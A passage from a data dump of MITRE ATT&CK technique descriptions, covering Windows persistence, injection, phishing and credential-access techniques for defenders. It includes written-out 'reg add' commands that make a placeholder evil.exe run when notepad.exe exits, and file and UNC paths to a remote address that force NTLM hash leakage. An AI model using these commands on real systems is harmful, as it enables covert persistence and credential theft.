                          'policy for a computer or domain. The Local Security Authority (LSA) is the main component '
                          'responsible for local security policy and user authentication. The LSA includes multiple '
                          'dynamic link libraries (DLLs) associated with various other security functions, all of '
                          'which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: '
                          'Microsoft Security Subsystem)\n'
                          '\n'
                          'Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either '
                          'replacing or adding illegitimate drivers (e.g., [DLL '
                          'Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order '
                          'Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary '
                          'code execution triggered by continuous LSA operations.',
           'name': 'LSASS Driver',
           'platforms': ['Windows']},
 'T1178': {'attack_id': 'T1178',
           'categories': ['privilege-escalation'],
           'description': 'The Windows security identifier (SID) is a unique value that identifies a user or group '
                          'account. SIDs are used by Windows security in both security descriptors and access tokens. '
                          '(Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active '
                          'Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable '
                          'account migration between domains (e.g., all values in SID-History are included in access '
                          'tokens).\n'
                          '\n'
                          'Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or '
                          'equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs '
                          'Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary '
                          'users/groups such as Enterprise Administrators. This manipulation may result in elevated '
                          'access to local resources and/or access to otherwise inaccessible domains via lateral '
                          'movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), '
                          '[Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote '
                          'Management](https://attack.mitre.org/techniques/T1028).',
           'name': 'SID-History Injection',
           'platforms': ['Windows']},
 'T1179': {'attack_id': 'T1179',
           'categories': ['persistence', 'privilege-escalation', 'credential-access'],
           'description': 'Windows processes often leverage application programming interface (API) functions to '
                          'perform tasks that require reusable system resources. Windows API functions are typically '
                          'stored in dynamic-link libraries (DLLs) as exported functions. \n'
                          '\n'
                          'Hooking involves redirecting calls to these functions and can be implemented via:\n'
                          '\n'
                          '* **Hooks procedures**, which intercept and execute designated code in response to events '
                          'such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) '
                          '(Citation: Endgame Process Injection July 2017)\n'
                          '* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where '
                          'pointers to imported API functions are stored. (Citation: Endgame Process Injection July '
                          '2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic '
                          'Hooking 2015)\n'
                          '* **Inline hooking**, which overwrites the first bytes in an API function to redirect code '
                          'flow. (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge Inline '
                          'Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n'
                          '\n'
                          'Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may '
                          'use hooking to load and execute malicious code within the context of another process, '
                          "masking the execution while also allowing access to the process's memory and possibly "
                          'elevated privileges. Installing hooking mechanisms may also provide Persistence via '
                          'continuous invocation when the functions are called through normal use.\n'
                          '\n'
                          'Malicious hooking mechanisms may also capture API calls that include parameters that reveal '
                          'user authentication credentials for Credential Access. (Citation: Microsoft '
                          'TrojanSpy:Win32/Ursnif.gen!I Sept 2017)\n'
                          '\n'
                          'Hooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to '
                          'conceal files, processes, Registry keys, and other objects in order to hide malware and '
                          'associated behaviors. (Citation: Symantec Windows Rootkits)',
           'name': 'Hooking',
           'platforms': ['Windows']},
 'T1180': {'attack_id': 'T1180',
           'categories': ['persistence'],
           'description': 'Screensavers are programs that execute after a configurable time of user inactivity and '
                          'consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia '
                          'Screensaver) The Windows screensaver application scrnsave.scr is located in '
                          '<code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code> on 64-bit '
                          'Windows systems, along with screensavers included with base Windows installations. \n'
                          '\n'
                          'The following screensaver settings are stored in the Registry (<code>HKCU\\Control '
                          'Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n'
                          '\n'
                          '* <code>SCRNSAVE.exe</code> - set to malicious PE path\n'
                          "* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n"
                          "* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n"
                          '* <code>ScreenSaverTimeout</code> - sets user inactivity timeout before screensaver is '
                          'executed\n'
                          '\n'
                          'Adversaries can use screensaver settings to maintain persistence by setting the screensaver '
                          'to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug '
                          '2017)',
           'name': 'Screensaver',
           'platforms': ['Windows']},
 'T1181': {'attack_id': 'T1181',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Before creating a window, graphical Windows-based processes must prescribe to or register a '
                          'windows class, which stipulate appearance and behavior (via windows procedures, which are '
                          'functions that handle input/output of data). (Citation: Microsoft Window Classes) '
                          'Registration of new windows classes can include a request for up to 40 bytes of extra '
                          'window memory (EWM) to be appended to the allocated memory of each instance of that class. '
                          'This EWM is intended to store data specific to that window and has specific application '
                          'programming interface (API) functions to set and get its value. (Citation: Microsoft '
                          'GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n'
                          '\n'
                          'Although small, the EWM is large enough to store a 32-bit pointer and is often used to '
                          'point to a windows procedure. Malware may possibly utilize this memory location in part of '
                          'an attack chain that includes writing code to shared sections of the process’s memory, '
                          'placing a pointer to the code in EWM, then invoking execution by returning execution '
                          'control to the address in the process’s EWM.\n'
                          '\n'
                          'Execution granted through EWM injection may take place in the address space of a separate '
                          'live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), '
                          "this may allow access to both the target process's memory and possibly elevated privileges. "
                          'Writing payloads to shared sections also avoids the use of highly monitored API calls such '
                          'as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July '
                          '2017) More sophisticated malware samples may also potentially bypass protection mechanisms '
                          'such as data execution prevention (DEP) by triggering a combination of windows procedures '
                          'and other system functions that will rewrite the malicious payload inside an executable '
                          'portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: '
                          'WeLiveSecurity Gapz and Redyms Mar 2013)',
           'name': 'Extra Window Memory Injection',
           'platforms': ['Windows']},
 'T1182': {'attack_id': 'T1182',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry '
                          'key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> '
                          'are loaded into every process that calls the ubiquitously used application programming '
                          'interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, '
                          'CreateProcessWithTokenW, or WinExec. (Citation: Endgame Process Injection July 2017)\n'
                          '\n'
                          'Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can '
                          'be abused to obtain persistence and privilege escalation by causing a malicious DLL to be '
                          'loaded and run in the context of separate processes on the computer.',
           'name': 'AppCert DLLs',
           'platforms': ['Windows']},
 'T1183': {'attack_id': 'T1183',
           'categories': ['privilege-escalation', 'persistence', 'defense-evasion'],
           'description': 'Image File Execution Options (IFEO) enable a developer to attach a debugger to an '
                          'application. When a process is created, a debugger present in an application’s IFEO will be '
                          'prepended to the application’s name, effectively launching the new process under the '
                          'debugger (e.g., “C:\\dbg\\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO '
                          'Mar 2010)\n'
                          '\n'
                          'IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. '
                          '(Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values '
                          'in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where '
                          '<code><executable></code> is the binary on which the debugger is attached. (Citation: '
                          'Microsoft Dev Blog IFEO Mar 2010)\n'
                          '\n'
                          'IFEOs can also enable an arbitrary monitor program to be launched when a specified program '
                          'silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode '
                          'process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR '
                          '2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by '
                          'directly modifying IEFO and silent process exit Registry values in '
                          '<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit '
                          'NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n'
                          '\n'
                          'An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar '
                          'Moe IFEO APR 2018)\n'
                          '\n'
                          '* <code>reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File '
                          'Execution Options\\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>\n'
                          '* <code>reg add "HKLM\\SOFTWARE\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" /v ReportingMode /t REG_DWORD /d '
                          '1</code>\n'
                          '* <code>reg add "HKLM\\SOFTWARE\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" /v MonitorProcess /d '
                          '"C:\\temp\\evil.exe"</code>\n'
                          '\n'
                          'Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may '
                          'be abused to obtain persistence and privilege escalation by causing a malicious executable '
                          'to be loaded and run in the context of separate processes on the computer. (Citation: '
                          'Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide '
                          'Persistence via continuous invocation.\n'
                          '\n'
                          'Malware may also use IFEO for Defense Evasion by registering invalid debuggers that '
                          'redirect and effectively disable various system and security applications. (Citation: '
                          'FSecure Hupigon) (Citation: Symantec Ushedix June 2008)',
           'name': 'Image File Execution Options Injection',
           'platforms': ['Windows']},
 'T1184': {'attack_id': 'T1184',
           'categories': ['lateral-movement'],
           'description': 'Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It '
                          'allows a user to connect to another system via an encrypted tunnel, commonly authenticating '
                          'through a password, certificate or the use of an asymmetric encryption key pair.\n'
                          '\n'
                          'In order to move laterally from a compromised host, adversaries may take advantage of trust '
                          'relationships established with other systems via public key authentication in active SSH '
                          'sessions by hijacking an existing connection to another system. This may occur through '
                          "compromising the SSH agent itself or by having access to the agent's socket. If an "
                          'adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. '
                          '(Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH '
                          'Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH '
                          'credentials. (Citation: Welivesecurity Ebury SSH)\n'
                          '\n'
                          '[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote '
                          'Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing '
                          'SSH session rather than creating a new session using [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078).',
           'name': 'SSH Hijacking',
           'platforms': ['Linux', 'macOS']},
 'T1185': {'attack_id': 'T1185',
           'categories': ['collection'],
           'description': 'Adversaries can take advantage of security vulnerabilities and inherent functionality in '
                          'browser software to change content, modify behavior, and intercept information as part of '
                          'various man in the browser techniques. (Citation: Wikipedia Man in the Browser)\n'
                          '\n'
                          'A specific example is when an adversary injects software into a browser that allows an them '
                          'to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the '
                          'browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser '
                          'Pivot) (Citation: ICEBRG Chrome Extensions)\n'
                          '\n'
                          'Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. '
                          "Browser traffic is pivoted from the adversary's browser through the user's browser by "
                          'setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not '
                          "alter the user's traffic in any way. The proxy connection is severed as soon as the browser "
                          'is closed. Whichever browser process the proxy is injected into, the adversary assumes the '
                          'security context of that process. Browsers typically create a new process for each tab that '
                          'is opened and permissions and certificates are separated accordingly. With these '
                          'permissions, an adversary could browse to any resource on an intranet that is accessible '
                          'through the browser and which the browser has sufficient permissions, such as Sharepoint or '
                          'webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. '
                          '(Citation: cobaltstrike manual)',
           'name': 'Man in the Browser',
           'platforms': ['Windows']},
 'T1186': {'attack_id': 'T1186',
           'categories': ['defense-evasion'],
           'description': 'Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file '
                          'operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one '
                          'transacted handle to write to a file at a given time. Until the write handle transaction is '
                          'terminated, all other handles are isolated from the writer and may only read the committed '
                          'version of the file that existed at the time the handle was opened. (Citation: Microsoft '
                          'Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system '
                          'or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n'
                          '\n'
                          'Although deprecated, the TxF application programming interface (API) is still enabled as of '
                          'Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n'
                          '\n'
                          'Adversaries may leverage TxF to a perform a file-less variation of [Process '
                          'Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. Similar '
                          'to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging '
                          'involves replacing the memory of a legitimate process, enabling the veiled execution of '
                          "malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF "
                          'also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, '
                          'VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec '
                          '2017)\n'
                          '\n'
                          'Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging '
                          'Dec 2017):\n'
                          '\n'
                          '* Transact – Create a TxF transaction using a legitimate executable then overwrite the file '
                          'with malicious code. These changes will be isolated and only visible within the context of '
                          'the transaction.\n'
                          '* Load – Create a shared section of memory and load the malicious executable.\n'
                          '* Rollback – Undo changes to original executable, effectively removing malicious code from '
                          'the file system.\n'
                          '* Animate – Create a process from the tainted section of memory and initiate execution.',
           'name': 'Process Doppelgänging',
           'platforms': ['Windows']},
 'T1187': {'attack_id': 'T1187',
           'categories': ['credential-access'],
           'description': 'The Server Message Block (SMB) protocol is commonly used in Windows networks for '
                          'authentication and communication between systems for access to resources and file sharing. '
                          'When a Windows system attempts to connect to an SMB resource it will automatically attempt '
                          'to authenticate and send credential information for the current user to the remote system. '
                          '(Citation: Wikipedia Server Message Block) This behavior is typical in enterprise '
                          'environments so that users do not need to enter credentials to access network resources. '
                          'Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a '
                          'backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will '
                          'typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) '
                          '(Citation: Microsoft Managing WebDAV Security)\n'
                          '\n'
                          'Adversaries may take advantage of this behavior to gain access to user account hashes '
                          'through forced SMB authentication. An adversary can send an attachment to a user through '
                          'spearphishing that contains a resource link to an external server controlled by the '
                          'adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place '
                          'a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed '
                          "on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's "
                          'system accesses the untrusted resource it will attempt authentication and send information '
                          "including the user's hashed credentials over SMB to the adversary controlled server. "
                          '(Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform '
                          'off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access '
                          'to plaintext credentials, or reuse it for [Pass the '
                          'Hash](https://attack.mitre.org/techniques/T1075). (Citation: Cylance Redirect to SMB)\n'
                          '\n'
                          'There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) '
                          'Some specifics from in-the-wild use include:\n'
                          '\n'
                          '* A spearphishing attachment containing a document with a resource that is automatically '
                          'loaded when the document is opened (i.e. [Template '
                          'Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for '
                          'example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger '
                          'the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n'
                          '* A modified .LNK or .SCF file with the icon filename pointing to an external reference '
                          'such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the '
                          'resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT '
                          'Energy Oct 2017)',
           'name': 'Forced Authentication',
           'platforms': ['Windows']},
 'T1188': {'attack_id': 'T1188',
           'categories': ['command-and-control'],
           'description': 'To disguise the source of malicious traffic, adversaries may chain together multiple '
                          'proxies. Typically, a defender will be able to identify the last proxy traffic traversed '
                          'before it enters their network; the defender may or may not be able to identify any '
                          'previous proxies before the last-hop proxy. This technique makes identifying the original '
                          'source of the malicious traffic even more difficult by requiring the defender to trace '
                          'malicious traffic through several proxies to identify its source.',
           'name': 'Multi-hop Proxy',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1189': {'attack_id': 'T1189',
           'categories': ['initial-access'],
           'description': 'A drive-by compromise is when an adversary gains access to a system through a user visiting '
                          "a website over the normal course of browsing. With this technique, the user's web browser "
                          'is targeted for exploitation.\n'
                          '\n'
                          'Multiple ways of delivering exploit code to a browser exist, including:\n'
                          '\n'
                          '* A legitimate website is compromised where adversaries have injected some form of '
                          'malicious code such as JavaScript, iFrames, cross-site scripting.\n'
                          '* Malicious ads are paid for and served through legitimate ad providers.\n'
                          '* Built-in web application interfaces are leveraged for the insertion of any other kind of '
                          'object that can be used to display web content or contain a script that executes on the '
                          'visiting client (e.g. forum posts, comments, and other user controllable web content).\n'
                          '\n'
                          'Often the website used by an adversary is one visited by a specific community, such as '
                          'government, a particular industry, or region, where the goal is to compromise a specific '
                          'user or set of users based on a shared interest. This kind of targeted attack is referred '
                          'to a strategic web compromise or watering hole attack. There are several known examples of '
                          'this occurring. (Citation: Shadowserver Strategic Web Compromise)\n'
                          '\n'
                          'Typical drive-by compromise process:\n'
                          '\n'
                          '1. A user visits a website that is used to host the adversary controlled content.\n'
                          '2. Scripts automatically execute, typically searching versions of the browser and plugins '
                          'for a potentially vulnerable version. \n'
                          '    * The user may be required to assist in this process by enabling scripting or active '
                          'website components and ignoring warning dialog boxes.\n'
                          '3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n'
                          '4. If exploitation is successful, then it will give the adversary code execution on the '
                          "user's system unless other protections are in place.\n"
                          '    * In some cases a second visit to the website after the initial scan is required before '
                          'exploit code is delivered.\n'
                          '\n'
                          'Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the '
                          'focus of this technique is to exploit software on a client endpoint upon visiting a '
                          'website. This will commonly give an adversary access to systems on the internal network '
                          'instead of external systems that may be in a DMZ.',
           'name': 'Drive-by Compromise',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1190': {'attack_id': 'T1190',
           'categories': ['initial-access'],
           'description': 'The use of software, data, or commands to take advantage of a weakness in an '
                          'Internet-facing computer system or program in order to cause unintended or unanticipated '
                          'behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. '
                          'These applications are often websites, but can include databases (like SQL) (Citation: NVD '
                          'CVE-2016-6662), standard services (like SMB (Citation: CIS Multiple SMB Vulnerabilities) or '
                          'SSH), and any other applications with Internet accessible open sockets, such as web servers '
                          'and related services. (Citation: NVD CVE-2014-7169) Depending on the flaw being exploited '
                          'this may include [Exploitation for Defense '
                          'Evasion](https://attack.mitre.org/techniques/T1211).\n'
                          '\n'
                          'For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common '
                          'web-based vulnerabilities. (Citation: OWASP Top 10) (Citation: CWE top 25)',
           'name': 'Exploit Public-Facing Application',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1191': {'attack_id': 'T1191',
           'categories': ['defense-evasion', 'execution'],
           'description': 'The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program '
                          'used to install Connection Manager service profiles. (Citation: Microsoft Connection '
                          'Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter '
                          'and installs a service profile leveraged for remote access connections.\n'
                          '\n'
                          'Adversaries may supply CMSTP.exe with INF files infected with malicious commands. '
                          '(Citation: Twitter CMSTP Usage Jan 2018) Similar to '
                          '[Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be '
                          'abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets '
                          '(SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate '
                          'AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass '
                          'AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft '
                          'application.\n'
                          '\n'
                          'CMSTP.exe can also be abused to [Bypass User Account '
                          'Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a '
                          'malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) '
                          '(Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)',
           'name': 'CMSTP',
           'platforms': ['Windows']},
 'T1192': {'attack_id': 'T1192',
           'categories': ['initial-access'],
           'description': 'Spearphishing with a link is a specific variant of spearphishing. It is different from '
                          'other forms of spearphishing in that it employs the use of links to download malware '
                          'contained in email, instead of attaching malicious files to the email itself, to avoid '
                          'defenses that may inspect email attachments. \n'
                          '\n'
                          'All forms of spearphishing are electronically delivered social engineering targeted at a '
                          'specific individual, company, or industry. In this case, the malicious emails contain '
                          'links. Generally, the links will be accompanied by social engineering text and require the '
                          'user to actively click or copy and paste a URL into a browser, leveraging [User '
                          'Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise '
                          'the web browser using an exploit, or the user will be prompted to download applications, '
                          'documents, zip files, or even executables depending on the pretext for the email in the '
                          'first place. Adversaries may also include links that are intended to interact directly with '
                          'an email reader, including embedded images intended to exploit the end system directly or '
                          'verify the receipt of an email (i.e. web bugs/web beacons).',
           'name': 'Spearphishing Link',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1193': {'attack_id': 'T1193',
           'categories': ['initial-access'],
           'description': 'Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment '
                          'is different from other forms of spearphishing in that it employs the use of malware '
                          'attached to an email. All forms of spearphishing are electronically delivered social '
                          'engineering targeted at a specific individual, company, or industry. In this scenario, '
                          'adversaries attach a file to the spearphishing email and usually rely upon [User '
                          'Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n'
                          '\n'
                          'There are many options for the attachment such as Microsoft Office documents, executables, '
                          'PDFs, or archived files. Upon opening the attachment (and potentially clicking past '
                          "protections), the adversary's payload exploits a vulnerability or directly executes on the "
                          "user's system. The text of the spearphishing email usually tries to give a plausible reason "
                          'why the file should be opened, and may explain how to bypass system protections in order to '
                          'do so. The email may also contain instructions on how to decrypt an attachment, such as a '
                          'zip file password, in order to evade email boundary defenses. Adversaries frequently '
                          'manipulate file extensions and icons in order to make attached executables appear to be '
                          'document files, or files exploiting one application appear to be a file for a different '
                          'one.',
           'name': 'Spearphishing Attachment',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1194': {'attack_id': 'T1194',
           'categories': ['initial-access'],
           'description': 'Spearphishing via service is a specific variant of spearphishing. It is different from '
                          'other forms of spearphishing in that it employs the use of third party services rather than '
                          'directly via enterprise email channels. \n'
                          '\n'
                          'All forms of spearphishing are electronically delivered social engineering targeted at a '
                          'specific individual, company, or industry. In this scenario, adversaries send messages '
                          'through various social media services, personal webmail, and other non-enterprise '
                          'controlled services. These services are more likely to have a less-strict security policy '
                          'than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport '
                          "with the target or get the target's interest in some way. Adversaries will create fake "
                          'social media accounts and message employees for potential job opportunities. Doing so '
                          "allows a plausible reason for asking about services, policies, and software that's running "
                          'in an environment. The adversary can then send malicious links or attachments through these '
                          'services.\n'
                          '\n'
                          'A common example is to build rapport with a target via social media, then send content to a '
                          'personal webmail service that the target uses on their work computer. This allows an '
                          'adversary to bypass some email restrictions on the work account, and the target is more '
                          "likely to open the file since it's something they were expecting. If the payload doesn't "
                          'work as expected, the adversary can continue normal communications and troubleshoot with '
                          'the target on how to get it working.',
           'name': 'Spearphishing via Service',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1195': {'attack_id': 'T1195',
           'categories': ['initial-access'],
           'description': 'Supply chain compromise is the manipulation of products or product delivery mechanisms '
                          'prior to receipt by a final consumer for the purpose of data or system compromise. \n'
                          '\n'
                          'Supply chain compromise can take place at any stage of the supply chain including:\n'
                          '\n'
                          '* Manipulation of development tools\n'
                          '* Manipulation of a development environment\n'
                          '* Manipulation of source code repositories (public or private)\n'
                          '* Manipulation of source code in open-source dependencies\n'
                          '* Manipulation of software update/distribution mechanisms\n'
                          '* Compromised/infected system images (multiple cases of removable media infected at the '
                          'factory)\n'
                          '* Replacement of legitimate software with modified versions\n'
                          '* Sales of modified/counterfeit products to legitimate distributors\n'
                          '* Shipment interdiction\n'
                          '\n'
                          'While supply chain compromise can impact any component of hardware or software, attackers '
                          'looking to gain execution have often focused on malicious additions to legitimate software '
                          'in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: '
                          'Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a '
                          'desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be '
                          'distributed to a broad set of consumers but only move on to additional tactics on specific '
                          'victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open '
                          'source projects that are used as dependencies in many applications may also be targeted as '
                          'a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM '
                          'Compromise)',
           'name': 'Supply Chain Compromise',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1196': {'attack_id': 'T1196',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Windows Control Panel items are utilities that allow users to view and adjust computer '
                          'settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) '
                          'files, the latter are actually renamed dynamic-link library (.dll) files that export a '
                          'CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL '
                          'Malware Jan 2014) Control Panel items can be executed directly from the command line, '
                          'programmatically via an application programming interface (API) call, or by simply '
                          'double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL '
                          'Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)\n'
                          '\n'
                          'For ease of use, Control Panel items typically include graphical menus available to users '
                          'after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing '
                          'CPL)\n'
                          '\n'
                          'Adversaries can use Control Panel items as execution payloads to execute arbitrary '
                          'commands. Malicious Control Panel items can be delivered via [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL '
                          'Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of '
                          'multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, '
                          'specifically CPL files, may also bypass application and/or file extension whitelisting.',
           'name': 'Control Panel Items',
           'platforms': ['Windows']},
 'T1197': {'attack_id': 'T1197',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous '
                          'file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft '
                          'COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other '
                          'applications preferred to operate in the background (using available idle bandwidth) '
                          'without interrupting other networked applications. File transfer tasks are implemented as '
                          'BITS jobs, which contain a queue of one or more file operations.\n'
                          '\n'
                          'The interface to create and manage BITS jobs is accessible through '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the '
                          '[BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)\n'
                          '\n'
                          'Adversaries may abuse BITS to download, execute, and even clean up after running malicious '
                          'code. BITS tasks are self-contained in the BITS job database, without new files or registry '
                          'modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June '
                          '2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) '
                          'BITS enabled execution may also allow Persistence by creating long-standing jobs (the '
                          'default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a '
                          'job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov '
                          '2017) (Citation: CTU BITS Malware June 2016)\n'
                          '\n'
                          'BITS upload functionalities can also be used to perform [Exfiltration Over Alternative '
                          'Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June '
                          '2016)',
           'name': 'BITS Jobs',
           'platforms': ['Windows']},
 'T1198': {'attack_id': 'T1198',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures '
                          "are used to verify a file's origin and integrity, variables that may be used to establish "
                          'trust in signed code (ex: a driver with a valid Microsoft signature may be handled as '
                          'safe). The signature validation process is handled via the WinVerifyTrust application '
                          'programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts '
                          'an inquiry and coordinates with the appropriate trust provider, which is responsible for '
                          'validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n'
                          '\n'
                          'Because of the varying executable file types and corresponding signature formats, Microsoft '
                          'created software components called Subject Interface Packages (SIPs) (Citation: '
                          'EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and '
                          'files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and '
